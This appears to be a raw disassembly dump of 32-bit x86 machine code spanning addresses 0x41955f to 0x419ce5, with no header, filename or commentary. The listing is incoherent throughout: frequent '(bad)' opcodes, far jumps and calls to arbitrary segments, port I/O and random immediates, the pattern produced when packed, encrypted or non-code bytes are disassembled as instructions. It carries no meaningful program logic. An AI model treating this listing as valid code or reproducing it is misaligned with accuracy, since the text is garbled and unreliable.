  41955f:	gs mov esp,0x6c5a2130
  419565:	mov    al,0x90
  419567:	add    al,BYTE PTR [eax]
  419569:	out    dx,eax
  41956a:	jmp    0xa9ec:0x54c79d2b
  419571:	pusha  
  419572:	repnz mov bl,0xe7
  419575:	(bad)  
  419576:	adc    ebp,ecx
  419578:	pop    ss
  419579:	cwde   
  41957a:	mov    esp,0x59d090bd
  41957f:	xchg   ecx,eax
  419580:	dec    edx
  419581:	pop    ebp
  419582:	aaa    
  419583:	mov    eax,ds:0xabf5846e
  419588:	aaa    
  419589:	iret   
  41958a:	xchg   edi,eax
  41958b:	sbb    esp,DWORD PTR [esi-0x6d]
  41958e:	loope  0x4195a0
  419590:	jmp    0x4a351a9b
  419595:	or     BYTE PTR [eax],0x4
  419598:	pop    eax
  419599:	add    esp,ecx
  41959b:	xor    ebx,DWORD PTR [eax+eax*4]
  41959e:	(bad)  [ecx+0x68]
  4195a1:	dec    edx
  4195a2:	pop    esp
  4195a3:	sub    eax,0xdae2f723
  4195a8:	shr    DWORD PTR [esi],cl
  4195aa:	cld    
  4195ab:	arpl   WORD PTR [eax-0x60b7d35a],dx
  4195b1:	jbe    0x4195dc
  4195b3:	les    esp,FWORD PTR [eax]
  4195b5:	bound  esi,QWORD PTR [edx+0x5afd4274]
  4195bb:	adc    cl,BYTE PTR [edx+ecx*4]
  4195be:	dec    edi
  4195bf:	and    eax,DWORD PTR [edx+0x4d]
  4195c2:	and    ebp,edi
  4195c4:	pop    ds
  4195c5:	fcomip st,st(0)
  4195c7:	ds push ss
  4195c9:	sbb    BYTE PTR [esi-0x7b],al
  4195cc:	xor    al,0xd3
  4195ce:	(bad)  
  4195cf:	arpl   WORD PTR [ecx-0x6b7f5362],sp
  4195d5:	jae    0x4195bb
  4195d7:	gs loopne 0x419616
  4195da:	int    0xc9
  4195dc:	xlat   BYTE PTR ds:[ebx]
  4195dd:	stos   BYTE PTR es:[edi],al
  4195de:	out    0x3b,al
  4195e0:	dec    esi
  4195e1:	mov    cl,0x74
  4195e3:	or     BYTE PTR [edi+edx*8+0x73],0x76
  4195e8:	mov    al,0x2c
  4195ea:	addr16 stc 
  4195ec:	ror    DWORD PTR ds:0x4bbd0595,1
  4195f2:	pop    edx
  4195f3:	push   ecx
  4195f4:	das    
  4195f5:	pop    es
  4195f6:	inc    ebx
  4195f7:	inc    ecx
  4195f8:	add    dh,BYTE PTR [ebx]
  4195fa:	fcomp  DWORD PTR [ecx+edx*1+0x429072e2]
  419601:	fld    QWORD PTR [edi+0x4f7a476e]
  419607:	xor    eax,0x5a1ae500
  41960c:	xchg   BYTE PTR [ebx-0x11],bl
  41960f:	call   0x830e:0x98531f86
  419616:	push   edx
  419617:	mov    ds:0x415a0c2b,al
  41961c:	sbb    ecx,0x6a
  41961f:	(bad)
  419623:	jle    0x41960e
  419625:	aad    0xb3
  419627:	popf   
  419628:	sub    BYTE PTR [edx],ch
  41962a:	test   DWORD PTR [edi+0x16a3ad2],0x6e078567
  419634:	sub    ah,cl
  419636:	mov    eax,es:0x2e17f6bc
  41963c:	fistp  WORD PTR [edi-0x330cc530]
  419642:	xchg   BYTE PTR [ecx+0x7f],ah
  419645:	mov    ebp,0x108a9f23
  41964a:	sub    al,0xb8
  41964c:	dec    ebp
  41964d:	(bad)  
  41964e:	das    
  41964f:	cmp    al,0xcf
  419651:	js     0x4195f7
  419653:	dec    esp
  419654:	inc    esi
  419655:	fdiv   QWORD PTR [ecx+0x6ae24de7]
  41965b:	in     al,0x8f
  41965d:	xchg   esi,eax
  41965e:	or     ebx,DWORD PTR [eax+esi*2+0x2b2d8e6d]
  419665:	xchg   esp,eax
  419666:	sbb    eax,0xbeebc787
  41966b:	jp     0x4196bf
  41966d:	ss jbe 0x419660
  419670:	add    eax,0x66796322
  419675:	stc    
  419676:	and    BYTE PTR [ebx+0x58a819e7],0x5
  41967d:	mul    DWORD PTR [ecx+0x49]
  419680:	pop    ebp
  419681:	ret    
  419682:	(bad)  
  419683:	ffree  st(1)
  419685:	(bad)  
  419686:	xor    BYTE PTR [edx],cl
  419688:	scas   al,BYTE PTR es:[edi]
  419689:	push   ebp
  41968a:	push   cs
  41968b:	icebp  
  41968c:	mov    al,0x14
  41968e:	addr16 jge 0x41961c
  419691:	cmp    eax,0xaed1242c
  419696:	(bad)  
  419697:	lods   eax,DWORD PTR ds:[esi]
  419698:	stos   DWORD PTR es:[edi],eax
  419699:	lds    eax,FWORD PTR [edi-0x3f79ec98]
  41969f:	call   0x4953:0xf65b2cdb
  4196a6:	fsubrp st(2),st
  4196a8:	pop    esi
  4196a9:	pop    edx
  4196aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196ab:	fadd   QWORD PTR [ebp-0x3c]
  4196ae:	je     0x4196bb
  4196b0:	pop    edi
  4196b1:	jbe    0x419636
  4196b3:	fistp  WORD PTR [ebx+0x1954cb62]
  4196b9:	add    BYTE PTR [ebp-0x1837f052],al
  4196bf:	xor    al,0xd7
  4196c1:	ins    BYTE PTR es:[edi],dx
  4196c2:	inc    eax
  4196c3:	cmp    al,0xb3
  4196c5:	jmp    0x4b3b:0x842a8893
  4196cc:	test   al,0x2a
  4196cf:	and    edi,ebp
  4196d1:	enter  0xb1ce,0xce
  4196d5:	outs   dx,BYTE PTR ds:[esi]
  4196d6:	mov    ah,0xe
  4196d8:	xchg   DWORD PTR es:[edx],eax
  4196db:	add    dl,dh
  4196dd:	sti    
  4196de:	or     DWORD PTR [ebp+0x30],0xe12ff7cb
  4196e5:	dec    eax
  4196e6:	add    BYTE PTR [ebx],0x96
  4196e9:	sti    
  4196ea:	and    BYTE PTR [eax-0x1b],dl
  4196ed:	js     0x419718
  4196ef:	and    al,0xf8
  4196f1:	jg     0x41971d
  4196f3:	out    dx,al
  4196f4:	nop
  4196f5:	dec    ebx
  4196f6:	mov    ebp,0x1dcc02e4
  4196fb:	lea    esp,[ebx-0x56]
  4196fe:	mov    al,0xc7
  419700:	cmp    eax,0xb183cca
  419705:	mov    ebp,ds
  419707:	sbb    ah,dh
  419709:	sbb    DWORD PTR [esp+esi*8-0x7f],0xffffff99
  41970e:	aaa    
  41970f:	(bad)  
  419711:	add    bh,BYTE PTR [edi-0x4ada9dc5]
  419717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419718:	sbb    dl,BYTE PTR [edx-0x61783ac4]
  41971e:	fnstsw WORD PTR [edx]
  419720:	fsubr  DWORD PTR [ebx+edx*2]
  419723:	pop    ss
  419724:	xor    BYTE PTR [edx-0xfabc882],dl
  41972a:	jae    0x4196c5
  41972c:	repz xchg esp,eax
  41972e:	stos   DWORD PTR es:[edi],eax
  41972f:	fcom   DWORD PTR [eax+0x14d4cfc1]
  419735:	aaa    
  419736:	in     al,0x2e
  419738:	fld    DWORD PTR [esi+edi*4]
  41973b:	retf   
  41973c:	and    DWORD PTR [eax+0x17af602e],0x8a5aa913
  419746:	fcomp  DWORD PTR [edi-0x22]
  419749:	sbb    eax,0x5dcb356
  41974e:	nop
  41974f:	scas   al,BYTE PTR es:[edi]
  419750:	inc    edx
  419751:	lods   eax,DWORD PTR ds:[esi]
  419752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419753:	push   ds
  419754:	adc    BYTE PTR [edx+ecx*2],bh
  419757:	ins    BYTE PTR es:[edi],dx
  419758:	pop    ecx
  419759:	jmp    0x4197ac
  41975b:	push   ss
  41975c:	mov    ecx,0x2c58907c
  419761:	or     al,0xd3
  419763:	push   ds
  419764:	ror    DWORD PTR [eax+ecx*8-0x22a8d693],0xda
  41976c:	and    eax,DWORD PTR [edi+ebx*8+0x4a7717e3]
  419773:	rcr    DWORD PTR [ebp+0x4c099d26],cl
  419779:	popf   
  41977a:	or     al,0xaa
  41977c:	push   cs
  41977d:	sub    eax,0x196af8c
  419782:	into   
  419783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419784:	not    BYTE PTR [ebx+0x61]
  419787:	jno    0x41976f
  419789:	inc    esi
  41978a:	fs std 
  41978c:	push   0xffffffdb
  41978e:	push   esi
  41978f:	int    0x3b
  419791:	or     BYTE PTR [ebx+0x67286c77],ch
  419797:	jecxz  0x419817
  419799:	mov    bl,0x1b
  41979b:	fiadd  WORD PTR [ebp-0x1a3579b1]
  4197a1:	inc    esp
  4197a2:	push   ecx
  4197a3:	(bad)  
  4197a4:	add    BYTE PTR [ecx+0x67ef0e8c],dh
  4197aa:	jg     0x419763
  4197ac:	jne    0x4197ed
  4197ae:	stos   DWORD PTR es:[edi],eax
  4197af:	mov    dl,0x0
  4197b1:	pop    ss
  4197b2:	outs   dx,DWORD PTR ds:[esi]
  4197b3:	jecxz  0x41979f
  4197b5:	sub    edx,DWORD PTR [esp+eax*2-0x58]
  4197b9:	adc    BYTE PTR [ebp-0x8673573],ch
  4197bf:	cdq    
  4197c0:	or     ebp,eax
  4197c2:	dec    edi
  4197c3:	push   ebp
  4197c4:	sbb    ch,dh
  4197c6:	mov    DWORD PTR [esi-0x15],edi
  4197c9:	jmp    0x41982f
  4197cb:	jo     0x41977a
  4197cd:	push   edi
  4197ce:	cmp    al,0xa0
  4197d0:	test   eax,0x2af426a0
  4197d5:	out    dx,eax
  4197d6:	or     BYTE PTR [edi+ecx*2+0x64],ch
  4197da:	pop    ds
  4197db:	std    
  4197dc:	xor    al,BYTE PTR [ecx]
  4197de:	mov    ebx,0x74304619
  4197e3:	inc    esp
  4197e4:	mov    esp,0x37b50a5b
  4197e9:	sahf   
  4197ea:	mov    ch,0x45
  4197ec:	lods   eax,DWORD PTR ds:[esi]
  4197ed:	and    al,0x6d
  4197ef:	jecxz  0x4197b3
  4197f1:	popf   
  4197f2:	cmc    
  4197f3:	mov    es,WORD PTR [esi]
  4197f5:	add    edx,DWORD PTR [ebx]
  4197f7:	cmc    
  4197f8:	stc    
  4197f9:	jo     0x41977c
  4197fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197fc:	sub    DWORD PTR [esi+0x2],edi
  4197ff:	test   BYTE PTR [ebp-0x5411e6c0],ch
  419805:	mov    esp,0x6d10bd75
  41980a:	push   cs
  41980b:	ficomp WORD PTR [edi]
  41980d:	popa   
  41980e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41980f:	xchg   esi,eax
  419810:	pop    edx
  419811:	jbe    0x4197c2
  419813:	das    
  419814:	push   0x957f1b89
  419819:	ja     0x419891
  41981b:	jle    0x419819
  41981d:	outs   dx,DWORD PTR ds:[esi]
  41981e:	pusha  
  41981f:	fwait
  419820:	mov    ch,0xe4
  419822:	push   ecx
  419823:	pop    ebx
  419824:	dec    ecx
  419825:	bound  esp,QWORD PTR [ebp+0xc04f8a4]
  41982b:	out    0xc1,al
  41982d:	xchg   edx,eax
  41982e:	mov    ah,0xcb
  419830:	ss daa 
  419832:	fcom   QWORD PTR [ebp-0xe]
  419835:	lock leave 
  419837:	stos   BYTE PTR es:[edi],al
  419838:	ret    0xa79c
  41983b:	retf   
  41983c:	ret    0x78b4
  41983f:	js     0x4197d1
  419841:	jl     0x41989a
  419843:	and    esi,edi
  419845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419846:	push   cs
  419847:	pop    ds
  419848:	jecxz  0x4198ae
  41984a:	and    ch,dh
  41984c:	dec    ebp
  41984d:	xbegin 0xc3f840f4
  419853:	rcr    BYTE PTR [ebp-0x3a063e9],cl
  419859:	out    dx,eax
  41985a:	fld    TBYTE PTR [ebx]
  41985c:	cdq    
  41985d:	imul   edx,ecx,0x45
  419860:	and    eax,0x30ba29e0
  419865:	sbb    dh,BYTE PTR [edi+0x13e80f98]
  41986b:	push   ss
  41986c:	mov    ds,WORD PTR [eax+edi*1+0x6a8c8e28]
  419873:	and    esp,DWORD PTR [edx]
  419875:	dec    edx
  419876:	inc    edx
  419877:	(bad)  
  419878:	loope  0x41984f
  41987a:	mov    ds:0x1e7e3b67,eax
  41987f:	jae    0x419816
  419881:	push   0xba1ad724
  419886:	in     eax,0x6
  419888:	mov    esp,0xbdecdd40
  41988d:	nop
  41988e:	leave  
  41988f:	push   edi
  419890:	push   edx
  419891:	leave  
  419892:	pop    ebp
  419893:	xchg   edi,eax
  419894:	cmp    al,0x1a
  419896:	pop    ss
  419897:	sub    eax,0x6656c263
  41989c:	xchg   esp,eax
  41989d:	outs   dx,BYTE PTR ds:[esi]
  41989e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41989f:	ret    
  4198a0:	stc    
  4198a1:	in     al,0x6b
  4198a3:	xchg   edi,eax
  4198a4:	sbb    DWORD PTR [eax-0x24],ebx
  4198a7:	or     eax,0x9522ab78
  4198ac:	add    dl,bl
  4198ae:	xor    eax,0xbd45a72e
  4198b3:	addr16 dec esi
  4198b5:	outs   dx,BYTE PTR ds:[esi]
  4198b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198b7:	pop    esp
  4198b8:	push   0x30
  4198ba:	xor    eax,0xc2144792
  4198bf:	inc    ebp
  4198c0:	outs   dx,DWORD PTR ds:[esi]
  4198c1:	std    
  4198c2:	jb     0x4198d1
  4198c4:	and    ebx,eax
  4198c6:	xor    eax,0xfc066a71
  4198cb:	mov    BYTE PTR [bp+0x17],ch
  4198cf:	push   edx
  4198d0:	ins    DWORD PTR es:[edi],dx
  4198d1:	and    eax,0x378833f3
  4198d6:	or     eax,0x48cf1f6c
  4198db:	sub    DWORD PTR [esi],ecx
  4198dd:	mov    edi,0x25a19478
  4198e2:	mov    al,0x1e
  4198e4:	jle    0x41990b
  4198e6:	mov    cl,0x98
  4198e8:	jo     0x419937
  4198ea:	inc    ebx
  4198eb:	mov    ecx,0xb92ebb21
  4198f0:	sbb    ebx,DWORD PTR ds:0x9d93d44e
  4198f6:	mov    ebx,0x6fa851e4
  4198fb:	(bad)  
  4198fc:	xchg   ebx,eax
  4198fd:	mov    bh,bl
  4198ff:	add    al,0xa9
  419901:	mov    ds:0xb1ceeec9,eax
  419906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419907:	inc    edx
  419908:	and    BYTE PTR [ebx+0x75f06633],0x74
  41990f:	ja     0x4198df
  419911:	fucom  st(2)
  419913:	add    eax,0xc4e593ab
  419918:	sub    DWORD PTR [ebx-0x5d956910],ecx
  41991e:	jo     0x419933
  419920:	pop    ebp
  419921:	inc    esp
  419922:	sub    DWORD PTR [ebx+0x61],ebp
  419925:	clc    
  419926:	mov    eax,es:0x43826b2f
  41992c:	or     al,0x28
  41992e:	stc    
  41992f:	les    ebx,FWORD PTR [ecx-0x11]
  419932:	stos   DWORD PTR es:[edi],eax
  419933:	add    edx,DWORD PTR [edx+edi*8+0xb]
  419937:	pop    eax
  419938:	ja     0x419949
  41993a:	mov    dh,0x6a
  41993c:	aad    0x28
  41993e:	inc    eax
  41993f:	iret   
  419940:	out    0xcf,al
  419942:	sbb    BYTE PTR [edi],bl
  419944:	out    0xf2,al
  419946:	mov    WORD PTR [edx],?
  419948:	test   eax,0xf5b28230
  41994d:	pop    es
  41994e:	dec    esp
  41994f:	inc    esp
  419950:	cdq    
  419951:	mov    dh,0x55
  419953:	and    BYTE PTR [esi],bh
  419955:	ret    0x2f79
  419958:	shl    BYTE PTR [edi+0x45],1
  41995b:	cmp    cl,BYTE PTR [eax-0x79]
  41995e:	or     dl,BYTE PTR [ebp+0x9]
  419961:	sbb    BYTE PTR ds:0xb5e15ed9,dl
  419967:	iret   
  419968:	mov    ebx,0x3f7a3812
  41996d:	mov    ebx,0x27b6a46
  419972:	sbb    BYTE PTR [esi+0x2f],ch
  419975:	out    0x0,al
  419977:	pop    ebp
  419978:	fsubr  DWORD PTR [ebp+0x46]
  41997b:	mov    ecx,0xba7b992e
  419980:	fisubr DWORD PTR [edi-0x1279e573]
  419986:	lahf   
  419987:	mov    bh,0x7
  419989:	lea    edx,[ebp-0x2a375593]
  41998f:	push   ebp
  419990:	inc    edi
  419991:	rol    BYTE PTR [esi+0x1f],1
  419994:	mov    esp,0x6e572c54
  419999:	push   0xf6f94a79
  41999e:	int    0x12
  4199a0:	ret    
  4199a1:	dec    ebp
  4199a2:	into   
  4199a3:	shl    BYTE PTR [eax+0x2a6178b3],cl
  4199a9:	lods   al,BYTE PTR ds:[esi]
  4199aa:	popa   
  4199ab:	mov    edi,0x9c0254aa
  4199b0:	mul    BYTE PTR [edi]
  4199b2:	and    DWORD PTR [edi+0x22],esi
  4199b5:	xchg   esi,eax
  4199b6:	in     al,dx
  4199b7:	push   es
  4199b8:	test   eax,0x3cd61e5d
  4199bd:	adc    DWORD PTR [edi+ebx*2],edi
  4199c0:	mov    BYTE PTR [ebx],al
  4199c2:	scas   al,BYTE PTR es:[edi]
  4199c3:	jb     0x4199f6
  4199c5:	ins    DWORD PTR es:[edi],dx
  4199c6:	test   eax,0xd0c5f25c
  4199cb:	adc    ebp,0xfffffff1
  4199ce:	jp     0x4199e1
  4199d0:	mov    WORD PTR [esi-0x696837ab],?
  4199d6:	pop    eax
  4199d7:	out    0x40,al
  4199d9:	cmovo  ebx,DWORD PTR [eax-0x556f14a8]
  4199e0:	jns    0x4199fa
  4199e2:	jne    0x419a01
  4199e4:	or     ecx,DWORD PTR [ebp-0x48]
  4199e7:	adc    al,0xe8
  4199e9:	cmp    esi,DWORD PTR [ebx-0x35]
  4199ec:	adc    al,0xec
  4199ee:	inc    BYTE PTR [ebx+0x4c66a1d9]
  4199f4:	pop    ss
  4199f5:	jmp    0x45a93e
  4199fa:	lods   al,BYTE PTR ds:[esi]
  4199fb:	pop    ss
  4199fc:	adc    al,BYTE PTR [ecx-0x749547e5]
  419a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a03:	das    
  419a04:	or     esi,edi
  419a06:	loope  0x419a54
  419a08:	inc    esi
  419a09:	pop    ecx
  419a0a:	(bad)  
  419a0b:	aad    0x99
  419a0d:	xor    al,0x8f
  419a0f:	sub    eax,0x2acaba6b
  419a14:	gs clc 
  419a16:	mov    edx,0xef80eee9
  419a1b:	mov    bh,0x99
  419a1d:	fmul   QWORD PTR [esi+edx*2-0x4843efa7]
  419a24:	ins    DWORD PTR es:[edi],dx
  419a25:	in     al,dx
  419a26:	or     esi,ebx
  419a28:	(bad)  
  419a29:	loope  0x4199eb
  419a2b:	push   cs
  419a2c:	leave  
  419a2d:	sahf   
  419a2e:	ret    0x87df
  419a31:	jg     0x419a09
  419a33:	push   eax
  419a34:	lock call 0x59b8:0x1eef9285
  419a3c:	aad    0xce
  419a3e:	xchg   ebp,eax
  419a3f:	dec    BYTE PTR [edx]
  419a41:	adc    DWORD PTR [edi-0x6a],0x2f4e3d93
  419a48:	or     BYTE PTR [ebx+0x225bfbcc],0xa3
  419a4f:	and    DWORD PTR [ebp+0x65f0022a],0xffffffef
  419a56:	pop    ds
  419a57:	jge    0x419a60
  419a59:	dec    esp
  419a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a5b:	mov    ebp,DWORD PTR [esi-0x80]
  419a5e:	add    al,0xf7
  419a60:	out    dx,eax
  419a61:	jae    0x419a43
  419a63:	pop    edx
  419a64:	rol    BYTE PTR [edi],cl
  419a66:	add    BYTE PTR [ebx-0x4c],al
  419a69:	stos   BYTE PTR es:[edi],al
  419a6a:	clc    
  419a6b:	pop    esi
  419a6c:	or     eax,0x9fe97ba5
  419a71:	push   esp
  419a72:	je     0x419ab3
  419a74:	sbb    eax,ecx
  419a76:	sbb    al,0x9f
  419a78:	icebp  
  419a79:	nop
  419a7a:	push   esi
  419a7b:	sub    DWORD PTR [ecx+ebx*1],ebp
  419a7e:	in     eax,0xab
  419a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a81:	dec    ebx
  419a82:	stc    
  419a83:	or     eax,0x2c91400
  419a88:	jmp    0x6453:0x49ddb6e6
  419a8f:	outs   dx,BYTE PTR ds:[esi]
  419a90:	fwait
  419a91:	add    eax,0xc05957d3
  419a96:	dec    ebp
  419a97:	fucom  st(4)
  419a99:	out    0x8b,al
  419a9b:	ror    BYTE PTR [eiz*1+0x2f8e7f57],1
  419aa2:	jp     0x419a41
  419aa4:	aad    0x2
  419aa6:	fwait
  419aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aa8:	pop    ebp
  419aa9:	out    0xbc,al
  419aab:	jmp    0x63fb:0x4b11556d
  419ab2:	inc    esp
  419ab3:	jge    0x419ae4
  419ab5:	xor    eax,0x89879b07
  419aba:	xor    bl,dl
  419abc:	out    dx,eax
  419abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419abe:	xchg   esp,eax
  419abf:	jg     0x419a65
  419ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac2:	fmul   DWORD PTR [esi]
  419ac4:	and    BYTE PTR [ecx-0x28],ch
  419ac7:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac9:	or     eax,0x34346163
  419ace:	(bad)  
  419acf:	enter  0x7a2a,0x28
  419ad3:	(bad)  [edi+0x5f]
  419ad6:	es out dx,eax
  419ad8:	jl     0x419a9f
  419ada:	js     0x419a9b
  419adc:	push   edi
  419add:	cmp    BYTE PTR [esi-0x2a16429d],al
  419ae3:	ret    0xe46
  419ae6:	jno    0x419a83
  419ae8:	xchg   edi,eax
  419ae9:	ret    
  419aea:	outs   dx,DWORD PTR ds:[esi]
  419aeb:	xor    al,0x32
  419aed:	ins    DWORD PTR es:[edi],dx
  419aee:	xor    bl,BYTE PTR [esi+0x9b8c0c2]
  419af4:	mov    edx,edi
  419af6:	mov    cl,BYTE PTR [edx+0x5]
  419af9:	xlat   BYTE PTR ds:[ebx]
  419afa:	into   
  419afb:	mov    al,0x42
  419afd:	xlat   BYTE PTR ds:[ebx]
  419afe:	push   0xb10a4c87
  419b03:	jns    0x419adb
  419b05:	or     ecx,DWORD PTR [eax-0x6b]
  419b08:	xchg   BYTE PTR [ebx],dl
  419b0a:	inc    ecx
  419b0b:	dec    ecx
  419b0c:	or     BYTE PTR [ecx],bl
  419b0e:	lds    edx,FWORD PTR [ebx]
  419b10:	push   cs
  419b11:	jl     0x419b19
  419b13:	adc    BYTE PTR [edx+0x76],0x2f
  419b17:	iret   
  419b18:	lods   eax,DWORD PTR ds:[esi]
  419b19:	out    dx,eax
  419b1a:	stos   BYTE PTR es:[edi],al
  419b1b:	push   ss
  419b1c:	mov    al,ds:0x1f3c4f5f
  419b21:	pushf  
  419b22:	adc    ebx,DWORD PTR [ecx+edi*4-0x5d]
  419b26:	clc    
  419b27:	mov    cl,0xa2
  419b29:	(bad)  
  419b2a:	push   0x75
  419b2c:	xor    edi,DWORD PTR [ebx+0x44846cdf]
  419b32:	stos   DWORD PTR es:[edi],eax
  419b33:	mov    ds:0x4a627312,eax
  419b38:	(bad)  [edx]
  419b3a:	ds test eax,0x5ff15c2e
  419b40:	scas   eax,DWORD PTR es:[edi]
  419b41:	aam    0x15
  419b43:	mov    al,0x58
  419b45:	add    edx,DWORD PTR [eax]
  419b47:	push   esi
  419b48:	dec    ecx
  419b49:	(bad)  
  419b4c:	dec    edx
  419b4d:	mov    al,ds:0x340a0273
  419b52:	sub    BYTE PTR [ecx+edi*4+0x67],0xd9
  419b57:	fs fs ds scas al,BYTE PTR es:[edi]
  419b5b:	(bad)  
  419b5c:	xchg   esp,eax
  419b5d:	ss icebp 
  419b5f:	push   es
  419b60:	fild   WORD PTR [edx-0x58ffead7]
  419b66:	loop   0x419b01
  419b68:	cwde   
  419b69:	xchg   edi,esp
  419b6b:	push   ss
  419b6c:	xor    eax,0x82094abb
  419b71:	ins    DWORD PTR es:[edi],dx
  419b72:	mul    DWORD PTR [edi+0x5d]
  419b75:	enter  0xf2ef,0xb9
  419b79:	rcr    DWORD PTR [eax],cl
  419b7b:	(bad)  
  419b7d:	ror    DWORD PTR [ebx-0x62],cl
  419b80:	sub    BYTE PTR [ebx-0x72d6aa13],0x81
  419b87:	sub    DWORD PTR [ebx+0x6],ecx
  419b8a:	addr16 mov ebp,0xdd7266fc
  419b90:	hlt    
  419b91:	cmp    esi,edx
  419b93:	or     DWORD PTR [eax-0x6b0cd218],ebp
  419b99:	dec    edi
  419b9a:	(bad)  
  419b9b:	aad    0x45
  419b9d:	add    eax,DWORD PTR [ebp+0x44]
  419ba0:	ret    0x3ffd
  419ba3:	stos   DWORD PTR es:[edi],eax
  419ba4:	leave  
  419ba5:	or     edx,edi
  419ba7:	sub    dl,BYTE PTR [eax]
  419ba9:	and    esi,ebp
  419bab:	outs   dx,BYTE PTR ds:[esi]
  419bac:	test   BYTE PTR [ebx],cl
  419bae:	(bad)  
  419baf:	std    
  419bb0:	pop    ebp
  419bb1:	sub    BYTE PTR [ebx],ch
  419bb3:	mov    cs,WORD PTR [eax+0x50]
  419bb6:	pusha  
  419bb7:	or     BYTE PTR [edi-0x10],bh
  419bba:	test   BYTE PTR [ecx],ch
  419bbc:	fmul   DWORD PTR [edx]
  419bbe:	gs jns 0x419bf7
  419bc1:	xor    al,0xaa
  419bc3:	inc    ebx
  419bc4:	leave  
  419bc5:	and    eax,0xbd4c3e00
  419bca:	dec    ecx
  419bcb:	dec    ebp
  419bcc:	sahf   
  419bcd:	arpl   WORD PTR [edi+0x1a47b28f],cx
  419bd3:	xchg   DWORD PTR [eax+0x26],ebx
  419bd6:	xchg   esp,eax
  419bd7:	ret    
  419bd8:	sbb    al,0x38
  419bda:	fnsave [ebp-0x2f1adce0]
  419be0:	scas   eax,DWORD PTR es:[edi]
  419be1:	cmp    al,0x1d
  419be3:	xchg   BYTE PTR [ebp+0xa],ch
  419be6:	in     al,dx
  419be7:	rol    DWORD PTR [ecx+eax*2],1
  419bea:	mov    ds:0xe74044bb,eax
  419bef:	xlat   BYTE PTR ds:[ebx]
  419bf0:	(bad)  
  419bf1:	xchg   ebx,eax
  419bf2:	xlat   BYTE PTR ds:[ebx]
  419bf3:	(bad)  
  419bf4:	mov    edx,0x7e9fc653
  419bf9:	mov    dl,0xb6
  419bfb:	jne    0x419c50
  419bfd:	jne    0x419bdf
  419bff:	daa    
  419c00:	loope  0x419bd3
  419c02:	in     al,0xea
  419c04:	(bad)
  419c07:	call   0xb484:0x31ff51f7
  419c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c0f:	jp     0x419bf2
  419c11:	adc    BYTE PTR [edi+0x1b8da99a],dh
  419c17:	push   edx
  419c18:	xor    cl,cl
  419c1a:	test   dh,al
  419c1c:	mov    ds:0xc5726bb2,eax
  419c21:	ins    DWORD PTR es:[edi],dx
  419c22:	inc    ecx
  419c23:	loopne 0x419bff
  419c25:	lds    esi,FWORD PTR [edx+edx*1+0x1e3997ad]
  419c2c:	std    
  419c2d:	stos   DWORD PTR es:[edi],eax
  419c2e:	fstp   QWORD PTR [edi-0x72]
  419c31:	sub    esp,DWORD PTR [edi+0x15]
  419c34:	cmp    DWORD PTR [ebp+0x417fea5a],edx
  419c3a:	adc    BYTE PTR [ebx+0x14facf16],cl
  419c40:	push   ebx
  419c41:	dec    ecx
  419c42:	sub    bl,BYTE PTR [edx]
  419c44:	or     al,0xf6
  419c46:	mov    ah,0xb
  419c48:	(bad)  
  419c49:	or     BYTE PTR [edi+0x6d],bl
  419c4c:	fmul   st(5),st
  419c4e:	dec    esp
  419c4f:	push   es
  419c50:	jmp    0x419cbb
  419c52:	mov    eax,ds:0xcad1291f
  419c57:	fiadd  DWORD PTR [edx+0x3429a861]
  419c5d:	and    BYTE PTR [ebp+eiz*8+0x33],0xa3
  419c62:	cmp    al,0xb
  419c64:	push   ebp
  419c65:	pop    ebx
  419c66:	sbb    dl,BYTE PTR [esi-0x3f]
  419c69:	jb     0x419ce1
  419c6b:	repz sbb al,dh
  419c6e:	inc    edx
  419c6f:	in     al,0x5b
  419c71:	add    edi,DWORD PTR [esi-0x34]
  419c74:	xor    DWORD PTR [ecx-0x73aa6407],edi
  419c7a:	or     BYTE PTR [ecx],bl
  419c7c:	push   ss
  419c7d:	out    0xbc,eax
  419c7f:	mov    BYTE PTR [esi+0x28],al
  419c82:	les    esp,FWORD PTR [ebp-0x66]
  419c85:	add    DWORD PTR [edx],ecx
  419c87:	push   eax
  419c88:	and    ebx,edx
  419c8a:	lods   eax,DWORD PTR ds:[esi]
  419c8b:	xchg   ebx,eax
  419c8c:	add    eax,0x1be5241e
  419c91:	repz (bad) 
  419c93:	and    DWORD PTR [ebx+0x66],esi
  419c96:	mov    ds:0xedebeffe,eax
  419c9b:	lock inc eax
  419c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c9e:	ficom  WORD PTR [edi+0x26]
  419ca1:	into   
  419ca2:	frstor [ebx+0x65601d47]
  419ca8:	fsub   DWORD PTR [esi-0x34]
  419cab:	pop    ebx
  419cad:	jle    0x419c92
  419caf:	into   
  419cb0:	js     0x419cb6
  419cb2:	cmp    BYTE PTR [edx],cl
  419cb4:	out    0x22,al
  419cb6:	and    eax,0xee104fbe
  419cbb:	mov    edx,0x1ea9f33c
  419cc0:	(bad)  
  419cc1:	mov    al,ds:0xd189e062
  419cc6:	cs xchg edi,eax
  419cc8:	je     0x419c66
  419cca:	pop    ebx
  419ccb:	add    ebx,DWORD PTR [edi]
  419ccd:	retf   0x3841
  419cd0:	inc    ebx
  419cd1:	clc    
  419cd2:	cmp    al,0x23
  419cd4:	inc    esp
  419cd5:	or     eax,0x43228d6a
  419cda:	imul   esi,DWORD PTR cs:[edx+eiz*2],0xffffffc4
  419cdf:	cs pop ebp
  419ce1:	cmc    
  419ce2:	xor    edx,ebp
  419ce4:	pop    ecx
  419ce5:	repnz or eax,esi
